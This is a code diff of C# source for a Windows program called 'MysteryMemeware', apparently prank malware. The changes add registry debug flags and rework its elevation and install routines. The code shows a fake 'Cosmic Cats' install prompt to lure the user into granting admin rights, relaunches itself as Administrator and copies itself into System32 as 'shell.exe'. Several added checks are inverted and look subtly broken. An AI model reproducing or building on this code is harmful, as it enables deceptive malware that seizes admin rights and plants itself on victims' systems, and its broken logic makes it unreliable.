@@ -2,12 +2,14 @@
 {
     public static class Program
     {
-        //Note last openned registry stored at Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit
-
-        //Approved 07/29/2022 12:55am
+        //Approved 07/30/2022 12:31am
         public static void Main()
         {
-            #region Run Main Logic
+            #region Main
+
+            #region DebugFlags
+            bool debugFlag_Main_A = false;
+            #endregion
 
             try
             {
@@ -36,12 +38,37 @@
             }
             catch
             {
+                debugFlag_Main_A = true;
+            }
+
+            #region SaveDebugFlags
+            try
+            {
+                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+
+                mysteryMemeware.SetValue("debugFlag_Main_A", debugFlag_Main_A);
+
+                mysteryMemeware.Close();
+                mysteryMemeware.Dispose();
+
+                localMachine.Close();
+                localMachine.Dispose();
+            }
+            catch
+            {
 
             }
+            #endregion
 
             #endregion
 
             #region Kill Current Process
+
+            #region DebugFlags
+            bool debugFlag_Kill_A = false;
+            #endregion
 
             try
             {
@@ -49,15 +76,46 @@
             }
             catch
             {
+                debugFlag_Kill_A = true;
+            }
+
+            #region SaveDebugFlags
+            try
+            {
+                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+
+                mysteryMemeware.SetValue("debugFlag_Kill_A", debugFlag_Kill_A);
+
+                mysteryMemeware.Close();
+                mysteryMemeware.Dispose();
+
+                localMachine.Close();
+                localMachine.Dispose();
+            }
+            catch
+            {
 
             }
+            #endregion
 
             #endregion
         }
-        //Approved 07/29/2022 12:55am
+        //Approved 07/30/2022 12:32am
         public static bool IsInstalled()
         {
-            #region Check If Installed
+            #region IsInstalled
+
+            #region DebugFlags
+            bool debugFlag_IsInstalled_A = false;
+            bool debugFlag_IsInstalled_A_0 = false;
+            bool debugFlag_IsInstalled_A_1 = false;
+            bool debugFlag_IsInstalled_A_2 = false;
+            bool debugFlag_IsInstalled_A_3 = false;
+            #endregion
+
+            bool isInstalled = false;
 
             try
             {
@@ -74,7 +132,7 @@
                 }
                 catch
                 {
-
+                    debugFlag_IsInstalled_A_0 = true;
                 }
 
                 try
@@ -84,7 +142,7 @@
                 }
                 catch
                 {
-
+                    debugFlag_IsInstalled_A_1 = true;
                 }
 
                 System.Type isInstalledType = isInstalledObject.GetType();
@@ -99,15 +157,17 @@
                     }
                     catch
                     {
-
+                        debugFlag_IsInstalled_A_2 = true;
                     }
 
                     if (isInstalledString is "1" || isInstalledString is "true" || isInstalledString is "t" || isInstalledString is "yes" || isInstalledString is "y")
                     {
-                        return true;
+                        isInstalled = true;
                     }
-
-                    return false;
+                    else
+                    {
+                        isInstalled = false;
+                    }
                 }
                 else if (isInstalledType == typeof(int))
                 {
@@ -115,10 +175,12 @@
 
                     if (isInstalledInt is 1)
                     {
-                        return true;
+                        isInstalled = true;
                     }
-
-                    return false;
+                    else
+                    {
+                        isInstalled = false;
+                    }
                 }
                 else if (isInstalledType == typeof(long))
                 {
@@ -126,25 +188,65 @@
 
                     if (isInstalledLong is 1)
                     {
-                        return true;
+                        isInstalled = true;
                     }
-
-                    return false;
+                    else
+                    {
+                        isInstalled = false;
+                    }
                 }
+                else
+                {
+                    debugFlag_IsInstalled_A_3 = true;
 
-                throw null;
+                    throw null;
+                }
             }
             catch
             {
-                return false;
+                debugFlag_IsInstalled_A = true;
             }
 
+            #region SaveDebugFlags
+            try
+            {
+                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+
+                mysteryMemeware.SetValue("debugFlag_IsInstalled_A", debugFlag_IsInstalled_A);
+                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_0", debugFlag_IsInstalled_A_0);
+                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_1", debugFlag_IsInstalled_A_1);
+                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_2", debugFlag_IsInstalled_A_2);
+                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_3", debugFlag_IsInstalled_A_3);
+
+                mysteryMemeware.Close();
+                mysteryMemeware.Dispose();
+
+                localMachine.Close();
+                localMachine.Dispose();
+            }
+            catch
+            {
+
+            }
             #endregion
+
+            #endregion
+
+            return isInstalled;
         }
-        //Approved 07/29/2022 12:50am
+        //Approved 07/30/2022 12:33am
         public static bool IsAdmin()
         {
-            #region Check If Admin
+            #region IsAdmin
+
+            #region DebugFlags
+            bool debugFlag_IsAdmin_A = false;
+            bool debugFlag_IsAdmin_A_0 = false;
+            #endregion
+
+            bool isAdmin = false;
 
             try
             {
@@ -152,7 +254,7 @@
 
                 System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
 
-                bool isAdministrator = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+                bool possibleIsAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
 
                 try
                 {
@@ -160,22 +262,46 @@
                 }
                 catch
                 {
-
+                    debugFlag_IsAdmin_A_0 = true;
                 }
 
-                return isAdministrator;
+                isAdmin = possibleIsAdmin;
             }
             catch
             {
-                return false;
+                debugFlag_IsAdmin_A = true;
             }
 
+            #region SaveDebugFlags
+            try
+            {
+                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+
+                mysteryMemeware.SetValue("debugFlag_IsAdmin_A", debugFlag_IsAdmin_A);
+                mysteryMemeware.SetValue("debugFlag_IsAdmin_A_0", debugFlag_IsAdmin_A_0);
+
+                mysteryMemeware.Close();
+                mysteryMemeware.Dispose();
+
+                localMachine.Close();
+                localMachine.Dispose();
+            }
+            catch
+            {
+
+            }
             #endregion
+
+            #endregion
+
+            return isAdmin;
         }
-        //Approved 07/29/2022 12:55am
+        //Approved 07/29/2022 12:24am
         public static void ElevateSelf()
         {
-            #region Get Admin Password
+            #region GetAdminPass
 
             string adminPassword = null;
 
@@ -286,7 +412,7 @@
 
             #endregion
 
-            #region Restart As Admin Or Run
+            #region Elevate
 
             try
             {
@@ -321,7 +447,7 @@
                     adminRestartStartInfo.StandardOutputEncoding = null;
                     adminRestartStartInfo.UserName = "Administrator";
                     adminRestartStartInfo.UseShellExecute = false;
-                    adminRestartStartInfo.Verb = "runas";
+                    adminRestartStartInfo.Verb = "";
                     adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
 
                     try
@@ -465,7 +591,7 @@
 
             try
             {
-                if (currentExecutablePath is not null)
+                if (currentExecutablePath is null)
                 {
                     throw null;
                 }
@@ -473,7 +599,7 @@
                 System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();
 
                 adminRestartStartInfo.Arguments = "";
-                adminRestartStartInfo.CreateNoWindow = true;
+                adminRestartStartInfo.CreateNoWindow = false;
                 adminRestartStartInfo.Domain = null;
                 adminRestartStartInfo.ErrorDialog = false;
                 adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
@@ -487,13 +613,15 @@
                 adminRestartStartInfo.StandardErrorEncoding = null;
                 adminRestartStartInfo.StandardOutputEncoding = null;
                 adminRestartStartInfo.UserName = null;
-                adminRestartStartInfo.UseShellExecute = false;
+                adminRestartStartInfo.UseShellExecute = true;
                 adminRestartStartInfo.Verb = "runas";
-                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
 
                 try
                 {
-                    adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
+                    adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
+
+                    //adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
                 }
                 catch
                 {
@@ -516,6 +644,8 @@
 
                 try
                 {
+                    System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo);
+
                     System.Diagnostics.Process.Start(adminRestartStartInfo);
                 }
                 catch (System.ComponentModel.Win32Exception ex)
@@ -543,64 +673,33 @@
         //Approved 07/26/2022 3:51pm
         public static void Install()
         {
-            /*
+            #region LocateSystem32
 
-            //disable reg Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0
-            //Disable reg Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0
+            #region DebugFlags
+            bool debugFlag_LocateSystem32 = false;
 
-            if (IsAdmin())
-            {
-                System.Windows.Forms.MessageBox.Show(IsAdmin().ToString());
-            }
-            else
-            {
-                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();
+            bool debugFlag_LocateSystem32_A = false;
+            bool debugFlag_LocateSystem32_A_0 = false;
+            bool debugFlag_LocateSystem32_A_1 = false;
+            bool debugFlag_LocateSystem32_A_2 = false;
 
-                adminRestartStartInfo.UseShellExecute = false;
-                adminRestartStartInfo.Arguments = "";
-                adminRestartStartInfo.CreateNoWindow = false;
-                adminRestartStartInfo.FileName = typeof(Program).Assembly.Location;
-                adminRestartStartInfo.UserName = "administrator";
-                adminRestartStartInfo.PasswordInClearText = "password";
-                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
+            bool debugFlag_LocateSystem32_B = false;
+            bool debugFlag_LocateSystem32_B_0 = false;
+            bool debugFlag_LocateSystem32_B_1 = false;
+            bool debugFlag_LocateSystem32_B_2 = false;
+            bool debugFlag_LocateSystem32_B_3 = false;
+            bool debugFlag_LocateSystem32_B_4 = false;
+            bool debugFlag_LocateSystem32_B_5 = false;
 
-                System.Diagnostics.Process adminRestartProcess = System.Diagnostics.Process.Start(adminRestartStartInfo);
-
-                while (!adminRestartProcess.Responding)
-                {
-
-                }
-
-                new System.Runtime.InteropServices.HandleRef(null, adminRestartProcess.MainWindowHandle);
-
-                System.Windows.Forms.SendKeys.SendWait("password~");
-
-                while (!adminRestartProcess.HasExited)
-                {
-
-                }
-            }
-             */
-
-            //Set the locations of some important paths including making sure that the install location is on the windows installation drive.
-            //This will ensure that it is runable on next start up and does not become unavailible if a USB device is unpluged or a network share drive becomes unavailible.
-            //Finally copy the currently running executable to the install location.
-
-            #region Locate System32
-
-            //Safely attempt to locate the system32 windows installation folder.
-
-            //Default value is null. A value of null means that all methods of locating system32 failed.
+            bool debugFlag_LocateSystem32_C = false;
+            bool debugFlag_LocateSystem32_C_0 = false;
+            #endregion
 
             string system32Path = null;
 
             try
             {
-                //First attempt to locate system 32 using Environment.GetFolderPath.
-
                 string potentialSystem32Path = System.Environment.SystemDirectory;
-
-                //Try to convert from a potentially local path to a full path if needed.
 
                 try
                 {
@@ -608,10 +707,8 @@
                 }
                 catch
                 {
-
+                    debugFlag_LocateSystem32_A_0 = true;
                 }
-
-                //Try to trim trailing directory separator character if needed.
 
                 try
                 {
@@ -622,31 +719,29 @@
                 }
                 catch
                 {
-
+                    debugFlag_LocateSystem32_A_1 = true;
                 }
 
-                //If the directory does not exist then throw an exception.
-
-                if (System.IO.Directory.Exists(potentialSystem32Path))
+                if (!System.IO.Directory.Exists(potentialSystem32Path))
                 {
-                    system32Path = potentialSystem32Path;
+                    debugFlag_LocateSystem32_A_2 = true;
+
+                    throw null;
                 }
-                else
-                {
-                    throw new System.Exception("Assertion that system32 was located at \"" + potentialSystem32Path + "\" proved false.");
-                }
+
+                system32Path = potentialSystem32Path;
             }
             catch
             {
+                debugFlag_LocateSystem32_A = true;
+
                 try
                 {
-                    //Second attempt to load the system root directory location from the registries.
-
                     Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
 
                     Microsoft.Win32.RegistryKey windowsNTCurrentVersion = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
 
-                    object systemRoot = windowsNTCurrentVersion.GetValue("SystemRoot", null);
+                    object systemRootObject = windowsNTCurrentVersion.GetValue("SystemRoot", null);
 
                     try
                     {
@@ -655,7 +750,7 @@
                     }
                     catch
                     {
-
+                        debugFlag_LocateSystem32_B_0 = true;
                     }
 
                     try
@@ -665,40 +760,20 @@
                     }
                     catch
                     {
-
+                        debugFlag_LocateSystem32_B_1 = true;
                     }
 
-                    //If systemRoot is null then the opperation failed and we should throw an exception.
-
-                    if (systemRoot is null)
+                    if (systemRootObject.GetType() != typeof(string))
                     {
-                        throw new System.Exception("SystemRoot does not exist or is inaccessable.");
+                        debugFlag_LocateSystem32_B_2 = true;
+
+                        throw null;
                     }
 
-                    //If systemRoot is not a string then we should throw an exception.
-
-                    if (systemRoot.GetType() != typeof(string))
-                    {
-                        throw new System.Exception("SystemRoot was not in a valid format.");
-                    }
-
-                    string systemRootString = (string)systemRoot;
+                    string systemRootString = (string)systemRootObject;
 
                     try
                     {
-                        //Convert from a potentially local path to a full path.
-
-                        systemRootString = new System.IO.DirectoryInfo(systemRootString).FullName;
-                    }
-                    catch
-                    {
-
-                    }
-
-                    try
-                    {
-                        //Trim trailing directory separator characters.
-
                         if (systemRootString[systemRootString.Length - 1] is '\\' || systemRootString[systemRootString.Length - 1] is '/')
                         {
                             systemRootString = systemRootString.Substring(0, systemRootString.Length - 1);
@@ -706,12 +781,10 @@
                     }
                     catch
                     {
-
+                        debugFlag_LocateSystem32_B_3 = true;
                     }
 
                     string potentialSystem32Path = systemRootString + "\\system32";
-
-                    //Try to convert from a potentially local path to a full path if needed.
 
                     try
                     {
@@ -719,184 +792,194 @@
                     }
                     catch
                     {
-
+                        debugFlag_LocateSystem32_B_4 = true;
                     }
-
-                    //Try to trim trailing directory separator character if needed.
-
-                    try
-                    {
-                        if (potentialSystem32Path[potentialSystem32Path.Length - 1] is '\\' || potentialSystem32Path[potentialSystem32Path.Length - 1] is '/')
-                        {
-                            potentialSystem32Path = potentialSystem32Path.Substring(0, potentialSystem32Path.Length - 1);
-                        }
-                    }
-                    catch
-                    {
-
-                    }
-
-                    //If the directory does not exist then throw an exception.
 
                     if (System.IO.Directory.Exists(potentialSystem32Path))
                     {
-                        system32Path = potentialSystem32Path;
+                        debugFlag_LocateSystem32_B_5 = true;
+
+                        throw null;
                     }
-                    else
-                    {
-                        throw new System.Exception("Assertion that system32 was located at \"" + potentialSystem32Path + "\" proved false.");
-                    }
+
+                    system32Path = potentialSystem32Path;
                 }
                 catch
                 {
+                    debugFlag_LocateSystem32_B = true;
+
                     try
                     {
-                        //Third assume that system 32 is located at "C:\Windows\system32"
-
-                        //If the directory does not exist then throw an exception.
-
-                        if (System.IO.Directory.Exists("C:\\Windows\\system32"))
+                        if (!System.IO.Directory.Exists("C:\\Windows\\system32"))
                         {
-                            system32Path = "C:\\Windows\\system32";
+                            debugFlag_LocateSystem32_C_0 = true;
+
+                            throw null;
                         }
-                        else
-                        {
-                            throw new System.Exception("Assertion that system32 was located at \"C:\\Windows\\system32\" proved false.");
-                        }
+
+                        system32Path = "C:\\Windows\\system32";
                     }
                     catch
                     {
+                        debugFlag_LocateSystem32_C = true;
 
+                        debugFlag_LocateSystem32 = true;
                     }
                 }
             }
 
             #endregion
 
-            #region Locate Root Drive
+            #region LocateRoot
 
-            //Safely attempt to locate the root drive.
+            #region DebugFlags
+            bool debugFlag_LocateRoot = false;
 
-            //Default value is null. A value of null means that all methods of locating the root drive failed.
+            bool debugFlag_LocateRoot_A = false;
+            bool debugFlag_LocateRoot_A_0 = false;
+            bool debugFlag_LocateRoot_A_1 = false;
+            bool debugFlag_LocateRoot_A_2 = false;
+            bool debugFlag_LocateRoot_A_3 = false;
+            bool debugFlag_LocateRoot_A_4 = false;
+            bool debugFlag_LocateRoot_A_5 = false;
+
+            bool debugFlag_LocateRoot_B = false;
+            bool debugFlag_LocateRoot_B_0 = false;
+
+            bool debugFlag_LocateRoot_C = false;
+            bool debugFlag_LocateRoot_C_0 = false;
+            #endregion
 
             string rootDrivePath = null;
 
             try
             {
-                //First check if root drive contains system 32 folder.
-
                 if (system32Path is null)
                 {
-                    throw new System.Exception("Prerequisite failed: System 32 could not be located.");
+                    debugFlag_LocateRoot_A_0 = true;
+
+                    throw null;
                 }
 
                 string potentialRootDrivePath = new System.IO.DriveInfo(system32Path).Name;
-
-                //Try to add a trailing directory separator character if needed.
 
                 try
                 {
                     if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.DirectorySeparatorChar && potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.AltDirectorySeparatorChar)
                     {
-                        if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.VolumeSeparatorChar)
+                        try
                         {
-                            potentialRootDrivePath = potentialRootDrivePath + new string(new char[1] { System.IO.Path.VolumeSeparatorChar });
+                            if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.VolumeSeparatorChar)
+                            {
+                                potentialRootDrivePath += new string(new char[1] { System.IO.Path.VolumeSeparatorChar });
+                            }
+                        }
+                        catch
+                        {
+                            debugFlag_LocateRoot_A_1 = true;
                         }
 
-                        potentialRootDrivePath = potentialRootDrivePath + new string(new char[1] { System.IO.Path.DirectorySeparatorChar });
+                        potentialRootDrivePath += new string(new char[1] { System.IO.Path.DirectorySeparatorChar });
                     }
                 }
                 catch
                 {
+                    debugFlag_LocateRoot_A_2 = true;
+
                     try
                     {
                         if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '\\' && potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '/')
                         {
-                            if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not ':')
+                            try
                             {
-                                potentialRootDrivePath = potentialRootDrivePath + ":";
+                                if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not ':')
+                                {
+                                    potentialRootDrivePath += ":";
+                                }
+                            }
+                            catch
+                            {
+                                debugFlag_LocateRoot_A_3 = true;
                             }
 
-                            potentialRootDrivePath = potentialRootDrivePath + "\\";
+                            potentialRootDrivePath += "\\";
                         }
                     }
                     catch
                     {
-
+                        debugFlag_LocateRoot_A_4 = true;
                     }
                 }
-
-                //If the drive directory does not exist then throw an exception.
 
                 if (System.IO.Directory.Exists(potentialRootDrivePath))
                 {
-                    rootDrivePath = potentialRootDrivePath;
+                    debugFlag_LocateRoot_A_5 = true;
+
+                    throw null;
                 }
-                else
-                {
-                    throw new System.Exception("Assertion that root drive was located at \"" + potentialRootDrivePath + "\" proved false.");
-                }
+
+                rootDrivePath = potentialRootDrivePath;
             }
             catch
             {
+                debugFlag_LocateRoot_A = true;
+
                 try
                 {
-                    //Second assume that the root drive path is C
-
                     string potentialRootDrivePath = new string(new char[3] { 'C', System.IO.Path.VolumeSeparatorChar, System.IO.Path.DirectorySeparatorChar });
-
-                    //If the drive directory does not exist then throw an exception.
 
                     if (System.IO.Directory.Exists(potentialRootDrivePath))
                     {
-                        rootDrivePath = potentialRootDrivePath;
+                        debugFlag_LocateRoot_B_0 = true;
+
+                        throw null;
                     }
-                    else
-                    {
-                        throw new System.Exception("Assertion that root drive was located at \"" + potentialRootDrivePath + "\" proved false.");
-                    }
+
+                    rootDrivePath = potentialRootDrivePath;
                 }
                 catch
                 {
+                    debugFlag_LocateRoot_B = true;
+
                     try
                     {
-                        //Third assume that the root drive path is C:\
-
-                        //If the drive directory does not exist then throw an exception.
-
                         if (System.IO.Directory.Exists("C:\\"))
                         {
-                            rootDrivePath = "C:\\";
+                            debugFlag_LocateRoot_C_0 = true;
                         }
-                        else
-                        {
-                            throw new System.Exception("Assertion that root drive was located at \"C:\\\" proved false.");
-                        }
+
+                        rootDrivePath = "C:\\";
                     }
                     catch
                     {
+                        debugFlag_LocateRoot_C = true;
 
+                        debugFlag_LocateRoot = true;
                     }
                 }
             }
 
             #endregion
 
-            #region Locate Current Executable
+            #region LocateExe
 
-            //Safely attempt to locate the location of the current executable.
+            #region DebugFlags
+            bool debugFlag_LocateExe = false;
 
-            //Default value is null. A value of null means that all methods of locating the current executable failed.
+            bool debugFlag_LocateExe_A = false;
+            bool debugFlag_LocateExe_A_0 = false;
+            bool debugFlag_LocateExe_A_1 = false;
+
+            bool debugFlag_LocateExe_B = false;
+            bool debugFlag_LocateExe_B_0 = false;
+            bool debugFlag_LocateExe_B_1 = false;
+            #endregion
 
             string currentExecutablePath = null;
 
             try
             {
-                //First attempt to locate the current executable using typeof(Program).Assemly.Location.
-
                 string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
-
-                //Try to convert from a potentially local path to a full path if needed.
 
                 try
                 {
@@ -904,29 +987,25 @@
                 }
                 catch
                 {
-
+                    debugFlag_LocateExe_A_0 = true;
                 }
-
-                //If the file does not exist then throw an exception.
 
                 if (System.IO.File.Exists(potentialCurrentExecutablePath))
                 {
-                    currentExecutablePath = potentialCurrentExecutablePath;
+                    debugFlag_LocateExe_A_1 = true;
+
+                    throw null;
                 }
-                else
-                {
-                    throw new System.Exception("Assertion that current executable was located at \"" + potentialCurrentExecutablePath + "\" proved false.");
-                }
+
+                currentExecutablePath = potentialCurrentExecutablePath;
             }
             catch
             {
+                debugFlag_LocateExe_A = true;
+
                 try
                 {
-                    //Second attempt to locate the current executable using GetCurrentProcess.MainModule.FileName.
-
                     string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-
-                    //Try to convert from a potentially local path to a full path if needed.
 
                     try
                     {
@@ -934,46 +1013,105 @@
                     }
                     catch
                     {
-
+                        debugFlag_LocateExe_B_0 = true;
                     }
-
-                    //If the file does not exist then throw an exception.
 
                     if (System.IO.File.Exists(potentialCurrentExecutablePath))
                     {
-                        currentExecutablePath = potentialCurrentExecutablePath;
+                        debugFlag_LocateExe_B_1 = true;
+
+                        throw null;
                     }
-                    else
-                    {
-                        throw new System.Exception("Assertion that current executable was located at \"" + potentialCurrentExecutablePath + "\" proved false.");
-                    }
+
+                    currentExecutablePath = potentialCurrentExecutablePath;
                 }
                 catch
                 {
+                    debugFlag_LocateExe_B = true;
 
+                    debugFlag_LocateExe = true;
                 }
             }
 
             #endregion
 
-            #region Install And Validate Path
+            #region Install
 
-            //Attempt to install the program to a valid path.
+            #region DebugFlags
+            bool debugFlag_Install = false;
 
-            //The default value is null. A value of null indicates all methods for installing failed.
+            bool debugFlag_Install_A = false;
+            bool debugFlag_Install_A_0 = false;
+            bool debugFlag_Install_A_1 = false;
+
+            bool debugFlag_Install_B = false;
+            bool debugFlag_Install_B_0 = false;
+            bool debugFlag_Install_B_1 = false;
+
+            bool debugFlag_Install_C = false;
+            bool debugFlag_Install_C_0 = false;
+            bool debugFlag_Install_C_1 = false;
+            bool debugFlag_Install_C_2 = false;
+
+            bool debugFlag_Install_D = false;
+            bool debugFlag_Install_D_0 = false;
+
+            bool debugFlag_Install_E = false;
+            bool debugFlag_Install_E_0 = false;
+
+            bool debugFlag_Install_F = false;
+            bool debugFlag_Install_F_0 = false;
+            bool debugFlag_Install_F_1 = false;
+
+            bool debugFlag_Install_G = false;
+            bool debugFlag_Install_G_0 = false;
+            #endregion
 
             string installLocation = null;
 
-            if (currentExecutablePath is not null)
+            try
             {
+                if (currentExecutablePath is null)
+                {
+                    debugFlag_Install_A_0 = true;
+
+                    throw null;
+                }
+
+                if (system32Path is null)
+                {
+                    debugFlag_Install_A_1 = true;
+
+                    throw null;
+                }
+
+                string potentialInstallLocation = system32Path + "\\shell.exe";
+
+                System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
+
+                installLocation = potentialInstallLocation;
+            }
+            catch
+            {
+                debugFlag_Install_A = true;
+
                 try
                 {
-                    if (system32Path is null)
+                    if (currentExecutablePath is null)
                     {
-                        throw new System.Exception("Prerequisite failed: System 32 could not be located.");
+                        debugFlag_Install_B_0 = true;
+
+                        throw null;
                     }
 
-                    string potentialInstallLocation = system32Path + "\\shell.exe";
+                    if (rootDrivePath is null)
+                    {
+                        debugFlag_Install_B_1 = true;
+
+                        throw null;
+                    }
+
+                    string potentialInstallLocation = rootDrivePath + "MysteryMemeware.exe";
 
                     System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
 
@@ -981,14 +1119,36 @@
                 }
                 catch
                 {
+                    debugFlag_Install_B = true;
+
                     try
                     {
-                        if (rootDrivePath is null)
+                        if (currentExecutablePath is null)
                         {
-                            throw new System.Exception("Prerequisite failed: Root drive could not be located.");
+                            debugFlag_Install_C_0 = true;
+
+                            throw null;
                         }
 
-                        string potentialInstallLocation = rootDrivePath + "MysteryMemeware.exe";
+                        if (rootDrivePath is null)
+                        {
+                            debugFlag_Install_C_1 = true;
+
+                            throw null;
+                        }
+
+                        string containingFolderPath = rootDrivePath + "MysteryMemeware";
+
+                        try
+                        {
+                            System.IO.Directory.CreateDirectory(containingFolderPath);
+                        }
+                        catch
+                        {
+                            debugFlag_Install_C_2 = true;
+                        }
+
+                        string potentialInstallLocation = containingFolderPath + "\\MysteryMemeware.exe";
 
                         System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
 
@@ -996,82 +1156,86 @@
                     }
                     catch
                     {
+                        debugFlag_Install_C = true;
+
                         try
                         {
-                            if (rootDrivePath is null)
+                            if (currentExecutablePath is null)
                             {
-                                throw new System.Exception("Prerequisite failed: Root drive could not be located.");
+                                debugFlag_Install_D_0 = true;
+
+                                throw null;
                             }
 
-                            string containingFolderPath = rootDrivePath + "MysteryMemeware";
+                            System.IO.File.Copy(currentExecutablePath, "C:\\Windows\\System32\\shell.exe", true);
 
-                            try
-                            {
-                                System.IO.Directory.CreateDirectory(containingFolderPath);
-                            }
-                            catch
-                            {
-
-                            }
-
-                            string potentialInstallLocation = containingFolderPath + "\\MysteryMemeware.exe";
-
-                            System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
-
-                            installLocation = potentialInstallLocation;
+                            installLocation = "C:\\Windows\\System32\\shell.exe";
                         }
                         catch
                         {
+                            debugFlag_Install_D = true;
+
                             try
                             {
-                                System.IO.File.Copy(currentExecutablePath, "C:\\Windows\\System32\\shell.exe", true);
+                                if (currentExecutablePath is null)
+                                {
+                                    debugFlag_Install_E_0 = true;
 
-                                installLocation = "C:\\Windows\\System32\\shell.exe";
+                                    throw null;
+                                }
+
+                                System.IO.File.Copy(currentExecutablePath, "C:\\MysteryMemeware.exe", true);
+
+                                installLocation = "C:\\MysteryMemeware.exe";
                             }
                             catch
                             {
+                                debugFlag_Install_E = true;
+
                                 try
                                 {
-                                    System.IO.File.Copy(currentExecutablePath, "C:\\MysteryMemeware.exe", true);
+                                    if (currentExecutablePath is null)
+                                    {
+                                        debugFlag_Install_F_0 = true;
 
-                                    installLocation = "C:\\MysteryMemeware.exe";
-                                }
-                                catch
-                                {
+                                        throw null;
+                                    }
+
                                     try
                                     {
-                                        if (rootDrivePath is null)
-                                        {
-                                            throw new System.Exception("Prerequisite failed: Root drive could not be located.");
-                                        }
-
-                                        string containingFolderPath = "C:\\MysteryMemeware";
-
-                                        try
-                                        {
-                                            System.IO.Directory.CreateDirectory(containingFolderPath);
-                                        }
-                                        catch
-                                        {
-
-                                        }
-
-                                        string potentialInstallLocation = "C:\\MysteryMemeware\\MysteryMemeware.exe";
-
-                                        System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
-
-                                        installLocation = potentialInstallLocation;
+                                        System.IO.Directory.CreateDirectory("C:\\MysteryMemeware");
                                     }
                                     catch
                                     {
-                                        try
-                                        {
-                                            installLocation = currentExecutablePath;
-                                        }
-                                        catch
-                                        {
+                                        debugFlag_Install_F_1 = true;
+                                    }
 
+                                    string potentialInstallLocation = "C:\\MysteryMemeware\\MysteryMemeware.exe";
+
+                                    System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);
+
+                                    installLocation = potentialInstallLocation;
+                                }
+                                catch
+                                {
+                                    debugFlag_Install_F = true;
+
+                                    try
+                                    {
+                                        if (currentExecutablePath is null)
+                                        {
+                                            debugFlag_Install_G_0 = true;
+
+                                            throw null;
                                         }
+
+                                        installLocation = currentExecutablePath;
+                                    }
+                                    catch
+                                    {
+                                        debugFlag_Install_G = true;
+
+                                        debugFlag_Install = true;
                                     }
                                 }
                             }
@@ -1082,198 +1246,346 @@
 
             #endregion
 
-            #region Get Current Username
+            #region GetUsername
 
-            //Attempt to get the username of the currently signed in user.
+            #region DebugFlags
+            bool debugFlag_GetUsername = false;
 
-            //The default value is null. A value of null indicates all methods for getting the current username failed.
+            bool debugFlag_GetUsername_A = false;
+            bool debugFlag_GetUsername_A_0 = false;
 
-            string currentUsername = null;
+            bool debugFlag_GetUsername_B = false;
+            bool debugFlag_GetUsername_B_0 = false;
